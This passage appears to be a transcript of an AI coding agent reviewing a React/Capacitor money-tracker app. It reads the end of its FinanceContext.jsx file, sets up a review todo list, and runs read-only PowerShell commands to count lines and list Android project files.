1074:       const isCompleted = newRemainingMonths === 0 || newRemainingAmount <= 0
1075: 
1076:       return {
1077:         ...prev,
1078:         transactions: [newTx, ...prev.transactions],
1079:         emis: prev.emis.map((e) =>
1080:           e.id === emiId
1081:             ? {
1082:                 ...e,
1083:                 totalPaid: (e.totalPaid || 0) + emiAmount,
1084:                 totalPaidCount: (e.totalPaidCount || 0) + 1,
1085:                 remainingMonths: newRemainingMonths,
1086:                 remainingAmount: newRemainingAmount,
1087:                 status: isCompleted ? EMI_STATUS.CLOSED : (e.status || EMI_STATUS.ACTIVE),
1088:                 lastPaidDate: today,
1089:                 updatedAt: Date.now(),
1090:                 payments: [...(e.payments || []), paymentRecord],
1091:               }
1092:             : e
1093:         ),
1094:       }
1095:     })
1096:     cancelEmiNotifications(emiId).catch(() => {})
1097:     const emi = emisRef.current.find((e) => e.id === emiId)
1098:     if (emi) {
1099:       const newRemaining = Math.max(0, (emi.remainingMonths || emi.tenureMonths || 0) - 1)
1100:       if (newRemaining > 0) {
1101:         const nextRef = new Date()
1102:         nextRef.setMonth(nextRef.getMonth() + 1)
1103:         scheduleEmiNotifications(
1104:           { ...emi, remainingMonths: newRemaining },
1105:           nextRef,
1106:         ).catch(() => {})
1107:       }
1108:     }
1109:     checkStreakMilestone([{ date: new Date().toISOString().split('T')[0] }, ...transactionsRef.current]).catch(() => {})
1110:     hapticLight()
1111:   }, [])
1112: 
1113:   const undoEmiPayment = useCallback((emiId) => {
1114:     const result = undoPayment(emiId)
1115:     if (result.success) {
1116:       setState((prev) => ({
1117:         ...prev,
1118:         emis: prev.emis.map((e) => (e.id === emiId ? result.emi : e)),
1119:       }))
1120:     }
1121:     return result
1122:   }, [])
1123: 
1124:   const emiSummary = useMemo(() => {
1125:     try { return getEnhancedEmiSummary(emis) } catch { return getEmiSummary(emis) }
1126:   }, [emis])
1127: 
1128:   const snapshotDiagnostics = useMemo(() => {
1129:     try { return getRecoveryChainSummary() } catch { return null }
1130:   }, [])
1131: 
1132:   const storageCorruptionReport = useMemo(() => {
1133:     try { return detectCorruption() } catch { return [] }
1134:   }, [])
1135: 
1136:   const backupHealth = useMemo(() => {
1137:     try { return getBackupHealth() } catch { return { status: 'unknown', message: '' } }
1138:   }, [])
1139: 
1140:   const backupStats = useMemo(() => {
1141:     try { return getBackupStats() } catch { return { totalExports: 0, totalEncryptedExports: 0, totalRestores: 0 } }
1142:   }, [])
1143: 
1144:   const recentPeople = useMemo(() => extractPeopleFromTransactions(transactions), [transactions])
1145: 
1146:   const dismissNotification = useCallback(() => setNotification(null), [])
1147: 
1148:   const addDocument = useCallback((data) => {
1149:     const doc = createDocument(data)
1150:     const documents = getDocuments()
1151:     setState((prev) => ({ ...prev, documents }))
1152:     return doc
1153:   }, [])
1154: 
1155:   const editDocument = useCallback((id, updates) => {
1156:     const result = updateDocument(id, updates)
1157:     if (result) {
1158:       const documents = getDocuments()
1159:       setState((prev) => ({ ...prev, documents }))
1160:     }
1161:     return result
1162:   }, [])
1163: 
1164:   const removeDocument = useCallback((id) => {
1165:     const ok = deleteDocument(id)
1166:     if (ok) {
1167:       const documents = getDocuments()
1168:       setState((prev) => ({ ...prev, documents }))
1169:     }
1170:     return ok
1171:   }, [])
1172: 
1173:   const addReceipt = useCallback((data) => {
1174:     const receipt = createReceiptUtil(data)
1175:     setState((prev) => ({ ...prev, receipts: [receipt, ...prev.receipts] }))
1176:     return receipt
1177:   }, [])
1178: 
1179:   const updateReceiptCb = useCallback((id, updates) => {
1180:     const updated = updateReceiptUtil(id, updates)
1181:     if (updated) {
1182:       setState((prev) => ({
1183:         ...prev,
1184:         receipts: prev.receipts.map((r) => (r.id === id ? updated : r)),
1185:       }))
1186:     }
1187:     return updated
1188:   }, [])
1189: 
1190:   const deleteReceiptCb = useCallback((id) => {
1191:     deleteReceiptUtil(id)
1192:     setState((prev) => ({ ...prev, receipts: prev.receipts.filter((r) => r.id !== id) }))
1193:   }, [])
1194: 
1195:   const createTransactionFromReceipt = useCallback((receiptData) => {
1196:     const newTx = {
1197:       type: 'expense',
1198:       amount: receiptData.amount,
1199:       category: receiptData.category,
1200:       date: receiptData.date,
1201:       note: receiptData.merchant + (receiptData.notes ? ' - ' + receiptData.notes : ''),
1202:       source: 'receipt_scan',
1203:     }
1204:     const tx = addTransaction(newTx)
1205:     const receipt = createReceiptUtil({ ...receiptData, transactionId: tx.id })
1206:     setState((prev) => ({ ...prev, receipts: [receipt, ...prev.receipts] }))
1207:     return { transaction: tx, receipt }
1208:   }, [addTransaction])
1209: 
1210:   const receiptStats = useMemo(() => {
1211:     try { return getReceiptStats(receipts) } catch { return { total: 0, thisMonth: 0, mostScannedCategory: null, avgConfidence: 0 } }
1212:   }, [receipts])
1213: 
1214:   const addWealthAsset = useCallback((data) => {
1215:     const asset = createWealthAssetUtil(data)
1216:     setState((prev) => ({ ...prev, wealthAssets: [...prev.wealthAssets, asset] }))
1217:     return asset
1218:   }, [])
1219: 
1220:   const updateWealthAssetCb = useCallback((id, updates) => {
1221:     const updated = updateWealthAssetUtil(id, updates)
1222:     if (updated) {
1223:       setState((prev) => ({
1224:         ...prev,
1225:         wealthAssets: prev.wealthAssets.map((a) => (a.id === id ? updated : a)),
1226:       }))
1227:     }
1228:     return updated
1229:   }, [])
1230: 
1231:   const deleteWealthAssetCb = useCallback((id) => {
1232:     deleteWealthAssetUtil(id)
1233:     setState((prev) => ({ ...prev, wealthAssets: prev.wealthAssets.filter((a) => a.id !== id) }))
1234:   }, [])
1235: 
1236:   const netWorthData = useMemo(() => {
1237:     try { return calculateNetWorth(wealthAssets, accounts, emis, debts) } catch { return { totalAssets: 0, totalLiabilities: 0, netWorth: 0, accountBalances: 0, cash: 0 } }
1238:   }, [wealthAssets, accounts, emis, debts])
1239: 
1240:   const netWorthHistory = useMemo(() => {
1241:     try { return getNetWorthHistory(wealthAssets, accounts, emis, debts) } catch { return [] }
1242:   }, [wealthAssets, accounts, emis, debts])
1243: 
1244:   const assetAllocation = useMemo(() => {
1245:     try { return getAssetAllocation(wealthAssets) } catch { return [] }
1246:   }, [wealthAssets])
1247: 
1248:   const portfolioSummary = useMemo(() => {
1249:     try { return getPortfolioSummary(wealthAssets) } catch { return { totalInvested: 0, totalCurrent: 0, totalProfitLoss: 0, profitLossPercent: 0 } }
1250:   }, [wealthAssets])
1251: 
1252:   const wealthScore = useMemo(() => {
1253:     try { return calculateWealthScore(wealthAssets, accounts, emis, debts) } catch { return { diversificationScore: 0, liquidityScore: 0, debtRatio: 0, investmentRatio: 0, overallScore: 0, grade: 'N/A', breakdown: [] } }
1254:   }, [wealthAssets, accounts, emis, debts])
1255: 
1256:   const wealthDashboardStats = useMemo(() => {
1257:     try { return getWealthDashboardStats(wealthAssets, accounts, emis, debts) } catch { return { netWorth: 0, totalAssets: 0, totalLiabilities: 0, totalInvested: 0, totalCurrent: 0, totalProfitLoss: 0, profitLossPercent: 0, assetCount: 0, wealthScore: 0, wealthGrade: 'N/A', topAllocation: [] } }
1258:   }, [wealthAssets, accounts, emis, debts])
1259: 
1260:   const documentStats = useMemo(() => {
1261:     try { return getDocumentStats() } catch { return { total: 0, totalFileSize: 0, thisMonth: 0, byCategory: {}, recent: [] } }
1262:   }, [])
1263: 
1264:   const dataQuality = useMemo(() => {
1265:     try {
1266:       const rels = safeStorage.get(STORAGE_KEYS.RELATIONSHIPS, [])
1267:       const transfers = transactions.filter((t) => t.type === 'transfer')
1268:       return runAllDataChecks(transactions, documents, debts, emis, accounts, rels, transfers)
1269:     } catch { return { issues: [], total: 0, bySeverity: {}, byCheck: {} } }
1270:   }, [transactions, documents, debts, emis, accounts])
1271: 
1272:   const reviewSummary = useMemo(() => {
1273:     try { return generateReviewSummary(transactions, debts, emis, goals, accounts) }
1274:     catch { return null }
1275:   }, [transactions, debts, emis, goals, accounts])
1276: 
1277:   const spendingInsights = useMemo(() => {
1278:     try { return generateSpendingInsights(transactions) } catch { return [] }
1279:   }, [transactions])
1280: 
1281:   const savingsRate = useMemo(() => {
1282:     try { return calculateSavingsRate(transactions) } catch { return { rate: 0, level: 'No Data', savings: 0, income: 0, expense: 0 } }
1283:   }, [transactions])
1284: 
1285:   const monthlyIncome = useMemo(() => {
1286:     const now = new Date()
1287:     return transactions.filter((t) => {
1288:       const d = new Date(t.date)
1289:       return t.type === 'income' && d.getMonth() === now.getMonth() && d.getFullYear() === now.getFullYear()
1290:     }).reduce((s, t) => s + t.amount, 0)
1291:   }, [transactions])
1292: 
1293:   const emiInsightsData = useMemo(() => {
1294:     try { return generateEmiInsights(emis, monthlyIncome) } catch { return [] }
1295:   }, [emis, monthlyIncome])
1296: 
1297:   const debtInsightsData = useMemo(() => {
1298:     try { return generateDebtInsights(debts) } catch { return [] }
1299:   }, [debts])
1300: 
1301:   const recurringInsightsData = useMemo(() => {
1302:     try { return generateRecurringInsights(recurring) } catch { return [] }
1303:   }, [recurring])
1304: 
1305:   const financialScore = useMemo(() => {
1306:     try { return calcFinancialScore(transactions, budgetsV2, debts, emis, recurring) } catch { return { score: 0, grade: 'N/A', summary: '', breakdown: [] } }
1307:   }, [transactions, budgetsV2, debts, emis, recurring])
1308: 
1309:   const smartRecommendations = useMemo(() => {
1310:     try { return generateSmartRecommendations(transactions, budgetsV2, debts, emis, goals, recurring) } catch { return [] }
1311:   }, [transactions, budgetsV2, debts, emis, goals, recurring])
1312: 
1313:   const budgetDashboardStats = useMemo(() => {

(Output capped at 50 KB. Showing lines 1-1313. Use offset=1314 to continue.)
</content>
```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 3.6s)

**Tool: read**

**Input:**
```json
{
  "filePath": "E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\\context\\FinanceContext.jsx",
  "offset": 1314
}
```

**Output:**
```
<path>E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\context\FinanceContext.jsx</path>
<type>file</type>
<content>
1314:     try { return getBudgetDashboardStats(budgetsV2) } catch { return { totalBudgets: 0, activeBudgets: 0, overBudgetCount: 0, totalBudgeted: 0, totalSpent: 0, utilization: 0 } }
1315:   }, [budgetsV2])
1316: 
1317:   const budgetHealthV2 = useMemo(() => {
1318:     try { return getBudgetHealthV2(budgetsV2) } catch { return { safe: 0, warning: 0, exceeded: 0, health: 100, totalActive: 0 } }
1319:   }, [budgetsV2])
1320: 
1321:   const budgetAlerts = useMemo(() => {
1322:     try { return getBudgetAlerts(budgetsV2) } catch { return [] }
1323:   }, [budgetsV2])
1324: 
1325:   const overspentCategories = useMemo(() => {
1326:     try { return getOverspentCategories(budgetsV2) } catch { return [] }
1327:   }, [budgetsV2])
1328: 
1329:   const backupDashboardStats = useMemo(() => {
1330:     try { return getBackupDashboardStats() } catch { return { backupCount: 0, latestBackupAt: null, healthScore: 0, healthGrade: 'F', healthStatus: 'critical', totalSize: 0 } }
1331:   }, [])
1332: 
1333:   const handleCreateBackup = useCallback(async () => {
1334:     try {
1335:       const result = await createManualBackup()
1336:       setBackupVersion((v) => v + 1)
1337:       return result
1338:     } catch { return null }
1339:   }, [])
1340: 
1341:   const transactionActions = useMemo(() => ({
1342:     addTransaction, deleteTransaction, updateTransaction, getBalance,
1343:     getMonthlySummary, getMonthlyData,
1344:   }), [addTransaction, deleteTransaction, updateTransaction, getBalance, getMonthlySummary, getMonthlyData])
1345: 
1346:   const recurringActions = useMemo(() => ({
1347:     addRecurring, updateRecurring, toggleRecurring, removeRecurring,
1348:     executeRecurring, executeAllRecurring, skipRecurring, skipAllRecurring,
1349:     pauseRecurring, resumeRecurring, skipNextOccurrence, editFutureOccurrences,
1350:   }), [addRecurring, updateRecurring, toggleRecurring, removeRecurring,
1351:     executeRecurring, executeAllRecurring, skipRecurring, skipAllRecurring,
1352:     pauseRecurring, resumeRecurring, skipNextOccurrence, editFutureOccurrences])
1353: 
1354:   const budgetActions = useMemo(() => ({
1355:     addBudgetV2, updateBudgetV2, deleteBudgetV2, archiveBudgetV2, reactivateBudgetV2, recalcBudgetsV2,
1356:   }), [addBudgetV2, updateBudgetV2, deleteBudgetV2, archiveBudgetV2, reactivateBudgetV2, recalcBudgetsV2])
1357: 
1358:   const tagActions = useMemo(() => ({
1359:     addTag, removeTag, renameTag, mergeTags,
1360:   }), [addTag, removeTag, renameTag, mergeTags])
1361: 
1362:   const debtActions = useMemo(() => ({
1363:     addDebt, updateDebt, deleteDebt, recordRepayment,
1364:     addLedgerPayment, undoLedgerPayment, editLedgerPayment, deleteLedgerPayment, doSettleLedger,
1365:   }), [addDebt, updateDebt, deleteDebt, recordRepayment,
1366:     addLedgerPayment, undoLedgerPayment, editLedgerPayment, deleteLedgerPayment, doSettleLedger])
1367: 
1368:   const goalActions = useMemo(() => ({ addGoal, editGoal, removeGoal }), [addGoal, editGoal, removeGoal])
1369: 
1370:   const templateActions = useMemo(() => ({ addTemplate, removeTemplate }), [addTemplate, removeTemplate])
1371: 
1372:   const emiActions = useMemo(() => ({
1373:     addEmi, updateEmi, deleteEmi, closeEmi, reopenEmi, pauseEmi, resumeEmi, markEmiPaid, undoEmiPayment,
1374:   }), [addEmi, updateEmi, deleteEmi, closeEmi, reopenEmi, pauseEmi, resumeEmi, markEmiPaid, undoEmiPayment])
1375: 
1376:   const documentActions = useMemo(() => ({
1377:     addDocument, editDocument, removeDocument,
1378:   }), [addDocument, editDocument, removeDocument])
1379: 
1380:   const receiptActions = useMemo(() => ({
1381:     addReceipt, updateReceiptCb, deleteReceiptCb, createTransactionFromReceipt,
1382:   }), [addReceipt, updateReceiptCb, deleteReceiptCb, createTransactionFromReceipt])
1383: 
1384:   const wealthActions = useMemo(() => ({
1385:     addWealthAsset, updateWealthAssetCb, deleteWealthAssetCb,
1386:   }), [addWealthAsset, updateWealthAssetCb, deleteWealthAssetCb])
1387: 
1388:   const computedData = useMemo(() => ({
1389:     insights, cashflowForecast, recentPeople, goalsProjections,
1390:     snapshotDiagnostics, storageCorruptionReport, backupHealth, backupStats,
1391:     pendingRecurring, dataQuality, reviewSummary,
1392:     spendingInsights, savingsRate, emiInsightsData, debtInsightsData, recurringInsightsData,
1393:     financialScore, smartRecommendations, budgetDashboardStats, budgetHealthV2,
1394:     budgetAlerts, overspentCategories, ledgerInsights, debtsSummary,
1395:     emiSummary, documentStats, receiptStats,
1396:     netWorthData, netWorthHistory, assetAllocation, portfolioSummary, wealthScore, wealthDashboardStats,
1397:     backupDashboardStats,
1398:   }), [insights, cashflowForecast, recentPeople, goalsProjections,
1399:     snapshotDiagnostics, storageCorruptionReport, backupHealth, backupStats,
1400:     pendingRecurring, dataQuality, reviewSummary,
1401:     spendingInsights, savingsRate, emiInsightsData, debtInsightsData, recurringInsightsData,
1402:     financialScore, smartRecommendations, budgetDashboardStats, budgetHealthV2,
1403:     budgetAlerts, overspentCategories, ledgerInsights, debtsSummary,
1404:     emiSummary, documentStats, receiptStats,
1405:     netWorthData, netWorthHistory, assetAllocation, portfolioSummary, wealthScore, wealthDashboardStats,
1406:     backupDashboardStats])
1407: 
1408:   const value = useMemo(() => ({
1409:     ...computedData,
1410:     transactions, transactionIndex, savingsGoal, budgets, recurring, tags, security, notification,
1411:     recoverySnapshot, goals, templates, recentTemplates,
1412:     budgetsV2, debts, emis, accounts, documents, receipts, wealthAssets,
1413:     ...transactionActions,
1414:     ...recurringActions,
1415:     ...budgetActions,
1416:     ...tagActions,
1417:     ...debtActions,
1418:     ...goalActions,
1419:     ...templateActions,
1420:     ...emiActions,
1421:     ...documentActions,
1422:     ...receiptActions,
1423:     ...wealthActions,
1424:     updateSavings, updateBudgets, updateBudgetLimit, updateSecurity,
1425:     updateAccounts, clearAllData, importData, dismissNotification,
1426:     restoreFromSnapshot, reloadFromStorage, handleCreateBackup,
1427:   }), [
1428:     computedData,
1429:     transactions, transactionIndex, savingsGoal, budgets, recurring, tags, security, notification,
1430:     recoverySnapshot, goals, templates, recentTemplates,
1431:     budgetsV2, debts, emis, accounts, documents, receipts, wealthAssets,
1432:     transactionActions, recurringActions, budgetActions, tagActions,
1433:     debtActions, goalActions, templateActions, emiActions, documentActions, receiptActions, wealthActions,
1434:     updateSavings, updateBudgets, updateBudgetLimit, updateSecurity,
1435:     updateAccounts, clearAllData, importData, dismissNotification,
1436:     restoreFromSnapshot, reloadFromStorage, handleCreateBackup,
1437:   ])
1438: 
1439:   return <FinanceContext.Provider value={value}>{children}</FinanceContext.Provider>
1440: }

(End of file - total 1440 lines)
</content>
```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 10.8s)

_Thinking:_

This is a massive single context file (1440 lines). I've now seen the core. There's a lot to review here. Given the enormity of this task (55+ pages, 100+ utils, tests), I should use parallel task agents to review different sections while I review the most critical files myself.

Let me set up a todo list and then dispatch agents to review:
1. Utils (data logic) - the financial calculations
2. Pages - UI components
3. Components - reusable
4. Config/Android/scripts
5. Security & storage
6. Tests

But the user asked for very specific things with actual line numbers. Agents can help, but I should verify key findings myself. Let me be strategic:

- I'll read key critical files myself: safeStorage.js, privacy.js, backup.js, security.js, documents.js, dataValidator, schema.js, PinLockScreen.jsx, notifications.js, etc. for security.
- Dispatch agents for the pages and utils in parallel.

Let me first check the total LOC to get stats. Let me count lines.

Let me set up todos and dispatch parallel agents.

Actually, let me think about the strategy. The repo has:
- shyblack/src with ~35 components, 40 pages, ~90 utils, ~27 test files, plus config
- android folder
- scripts folder
- public folder

That's a lot. Let me dispatch a few general agents to review different groups in parallel, each returning detailed findings with file:line references. Meanwhile, I review the security-critical files myself.

Let me first gather some basic stats (LOC counts, etc.), then dispatch agents.

Let me plan the agent tasks:

Agent 1: Review all utils/*.js files related to financial calculations & data integrity (debts, emi, budgets, insights, forecast, wealth, networth, recurring, bills, goals, analytics, trends, financialHealth, healthScore2, etc.) - report bugs with file:line.

Agent 2: Review all pages/*.jsx files (UI, state, error handling, validation, a11y, responsive, forms, API-like integrations). Report bugs with file:line.

Agent 3: Review all components/*.jsx + hooks + i18n + context. Report bugs.

Agent 4: Review security-critical utils (safeStorage, privacy, biometrics, security, backup, documents, receiptParser, downloadUtils, exports, pdfReport, pdfExport, notifications, reminders, emiNotifications, budgetNotifications) for security & correctness.

Agent 5: Review android/ + scripts/ + config (capacitor, vite, tailwind, eslint, postcss, index.html, public/), build/CI, and tests coverage.

That's 5 agents. Each should produce detailed findings. Given the size of the codebase, agents may have limited context. Let me give them focused instructions.

Actually, since the reports must reference actual line numbers and be verified, I'll need to verify the most critical findings myself. The agents can produce candidate findings which I verify.

Let me first count LOC stats myself.

This is a large codebase (~140 files, frontend-only). Let me set up tracking and gather statistics.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Gather project stats (LOC, file counts)",
      "status": "in_progress",
      "priority": "high"
    },
    {
      "content": "Review security-critical code (storage, privacy, crypto, biometrics, backups)",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Review core context/state management and App routing",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Review utils (financial calculations, data logic)",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Review pages (UI, forms, validation, a11y)",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Review components, hooks, i18n",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Review config, android, scripts, build",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Review tests & coverage",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Verify key findings against source",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Generate all 11 report files",
      "status": "pending",
      "priority": "high"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Gather project stats (LOC, file counts)",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Review security-critical code (storage, privacy, crypto, biometrics, backups)",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Review core context/state management and App routing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Review utils (financial calculations, data logic)",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Review pages (UI, forms, validation, a11y)",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Review components, hooks, i18n",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Review config, android, scripts, build",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Review tests & coverage",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Verify key findings against source",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Generate all 11 report files",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 5.0s)

**Tool: bash**

**Input:**
```json
{
  "command": "$files = Get-ChildItem -Recurse shyblack/src -File -Include *.js,*.jsx,*.cjs,*.json | Where-Object { $_.FullName -notmatch 'i18n' }; $total = ($files | Get-Content | Measure-Object -Line).Lines; Write-Output \"src (excl i18n) files: $($files.Count) LOC: $total\"; $i18n = Get-ChildItem shyblack/src/i18n -File; $i18nLines = ($i18n | Get-Content | Measure-Object -Line).Lines; Write-Output \"i18n files: $($i18n.Count) LOC: $i18nLines\""
}
```

**Output:**
```
src (excl i18n) files: 174 LOC: 41592
i18n files: 6 LOC: 6766

```

**Tool: bash**

**Input:**
```json
{
  "command": "$android = Get-ChildItem -Recurse shyblack/android -File -Include *.java,*.kt,*.xml,*.gradle,*.properties,*.json,*.js 2>$null; if ($android) { $al = ($android | Get-Content | Measure-Object -Line).Lines; Write-Output \"android files: $($android.Count) LOC: $al\" }; $scripts = Get-ChildItem -Recurse shyblack/scripts -File 2>$null; if ($scripts) { Write-Output \"scripts:\"; $scripts | ForEach-Object { $_.Name } }"
}
```

**Output:**
```
android files: 24 LOC: 431
scripts:
generate-icons.js

```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 6.1s)

**Tool: bash**

**Input:**
```json
{
  "command": "$tests = Get-ChildItem shyblack/src/__tests__ -File; $tl = ($tests | Get-Content | Measure-Object -Line).Lines; Write-Output \"test files: $($tests.Count) LOC: $tl\"; $tot = 41592 + 6766 + $tl; Write-Output \"src total LOC: $tot\"; $androidFiles = Get-ChildItem -Recurse shyblack/android -File; $al = ($androidFiles | Get-Content | Measure-Object -Line).Lines; Write-Output \"android total LOC: $al\""
}
```

**Output:**
```
test files: 25 LOC: 5202
src total LOC: 53560
android total LOC: 117761

```

**Tool: bash**

**Input:**
```json
{
  "command": "Get-ChildItem -Recurse shyblack/android -File | Select-Object FullName | Format-Table -AutoSize; Write-Output \"---public---\"; Get-ChildItem -Recurse shyblack/public -File | Select-Object FullName | Format-Table -AutoSize"
}
```

**Output:**
```

FullName                                                                                                               
--------                                                                                                               
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\.gitignore                             
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\build.gradle                           
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\capacitor.settings.gradle              
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\gradle.properties                      
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\gradlew                                
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\gradlew.bat                            
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\settings.gradle                        
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\variables.gradle                       
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\.gitignore                         
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\build.gradle                       
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\capacitor.build.gradle             
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\proguard-rules.pro                 
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\release\output-metadata.json       
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\release\baselineProfiles\0\app-r...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\release\baselineProfiles\1\app-r...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\androidTest\java\com\getcapa...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\AndroidManifest.xml       
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\java\com\shyblack\finan...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable\ic_launche...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable\ic_stat_fi...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable\splash.png   
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-hdpi\...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-ldpi\...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-mdpi\...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-xhdpi...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-xxhdp...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-land-xxxhd...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-night\spla...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-hdpi\...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-ldpi\...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-mdpi\...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-night...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-xhdpi...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-xxhdp...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-port-xxxhd...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\drawable-v24\ic_lau...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\layout\activity_mai...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-anydpi-v26\i...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-anydpi-v26\i...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-hdpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-hdpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-hdpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-hdpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-ldpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-ldpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-ldpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-ldpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-mdpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-mdpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-mdpi\ic_laun...
